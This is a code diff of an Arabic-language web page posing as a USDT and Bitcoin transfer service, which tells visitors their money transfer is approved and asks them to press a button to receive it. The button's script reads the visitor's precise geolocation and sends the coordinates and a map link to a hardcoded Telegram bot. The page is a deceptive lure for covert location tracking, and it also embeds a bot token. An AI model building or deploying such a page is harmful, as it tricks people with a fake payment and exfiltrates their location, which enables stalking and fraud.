@@ -1,93 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>عملات رقمية USDT وبيتكوين</title>
   <style>
     body {
-      background-color: #181818;
-      color: white;
-      font-family: sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    .group-box {
-      background-color: #222;
-      border-radius: 15px;
-      padding: 20px;
-      box-shadow: 0 0 20px gold;
-      max-width: 400px;
-      margin: auto;
-    }
-    .group-img {
-      width: 100px;
-      margin-bottom: 10px;
-    }
-    .group-name {
-      font-size: 1.4em;
-      font-weight: bold;
+      background-color: #000;
       color: gold;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      padding: 40px;
     }
-    .message {
-      background-color: #333;
-      padding: 15px;
-      margin-top: 15px;
-      border-radius: 10px;
-      color: #ddd;
+    img {
+      width: 150px;
+      margin-bottom: 20px;
     }
-    .button {
-      background-color: #FFD700;
-      color: #000;
+    h1 {
+      font-size: 28px;
+      margin-bottom: 30px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 20px;
+      background-color: gold;
+      color: black;
       border: none;
-      padding: 12px 20px;
-      font-size: 1em;
       border-radius: 10px;
       cursor: pointer;
-      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="group-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" class="group-img" alt="Bitcoin Logo">
-    <div class="group-name">عملات رقمية USDT وبيتكوين</div>
-    <div class="message">
-      تهانينا! لقد تم قبول الطلب لتحويل المال<br>
-      الرجاء الضغط على الزر أدناه لتأكيد العملية.
-    </div>
-    <button class="button" onclick="getLocation()">تأكيد تحويل المال</button>
-  </div>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo" />
+  <h1>عملات رقمية USDT وبيتكوين</h1>
+  <button onclick="getLocation()">رجاءً اضغط لتحويل المال لمحفظتك</button>
 
   <script>
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error, {
-          enableHighAccuracy: true,
-          timeout: 10000
-        });
+        navigator.geolocation.getCurrentPosition(sendToTelegram);
+      } else {
+        alert("Geolocation not supported.");
       }
     }
 
-    function success(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
-      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
-      const chat_id = "7485197107"; // معرف الشات
-      const message = `📍 موقع جديد:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;
+    function sendToTelegram(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
+      const chat_id = "7485197107";
+      const message = `📍 موقع جديد:\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
           chat_id: chat_id,
           text: message
         })
       });
-    }
-
-    function error(err) {
-      console.warn("لم يتم تحديد الموقع:", err);
     }
   </script>
 </body>
